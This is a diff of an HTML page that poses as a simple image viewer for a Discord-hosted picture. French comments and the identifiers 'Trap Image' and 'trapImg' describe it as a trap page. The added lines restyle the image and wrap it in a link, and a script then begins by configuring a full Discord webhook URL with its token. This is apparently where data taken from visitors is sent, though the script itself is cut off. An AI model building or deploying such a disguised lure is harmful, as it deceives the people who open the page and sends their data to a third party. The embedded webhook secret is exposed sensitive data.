@@ -5,14 +5,15 @@
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>Image</title>
     <style>
-        body { margin: 0; padding: 0; background: #2f3136; display: flex; justify-content: center; align-items: center; height: 100vh; }
-        img { max-width: 100%; max-height: 100%; border-radius: 8px; box-shadow: 0 4px 10px rgba(0,0,0,0.5); }
+        body { margin: 0; padding: 0; background: #2f3136; display: flex; justify-content: center; align-items: center; height: 100vh; overflow: hidden; }
+        img { max-width: 90vw; max-height: 90vh; border-radius: 8px; box-shadow: 0 4px 10px rgba(0,0,0,0.5); cursor: pointer; transition: transform 0.2s; }
+        img:hover { transform: scale(1.02); }
     </style>
 </head>
 <body>
-    <!-- Remplace src par l'URL de ton image piégée -->
-    <img src="https://media.discordapp.net/attachments/1503167778234962021/1503167805166587925/SPOILER_image.png?ex=6a96059c&is=6a94b41c&hm=30892b6e1510ac4149823f61df17f232f9215a480c3d362296f5be7140c4eb1f&=&format=webp&quality=lossless&width=1024&height=558" alt="Trap Image" id="trapImg">
-
+    <!-- L'image est un lien vers elle-même pour éviter les prévisualions de Discord complexes -->
+    <a href="#" id="imgLink">
+        <img src="https://media.discordapp.net/attachments/1503167778234962021/1503167805166587925/SPOILER_image.png?ex=6a96059c&is=6a94b41c&hm=30892b6e1510ac4149823f61df17f232f9215a480c3d362296f5be7140c4eb1f&=&format=webp&quality=lossless&width=1024&height=558">
     <script>
         // --- CONFIGURATION ---
         const WEBHOOK_URL = "https://discord.com/api/webhooks/1543762448643915799/o9B-rPF0YGlhtO00A48susJVoQEtou5nDakvei0zLorngDfdvh0KotsbULWKBnpVFTYG";
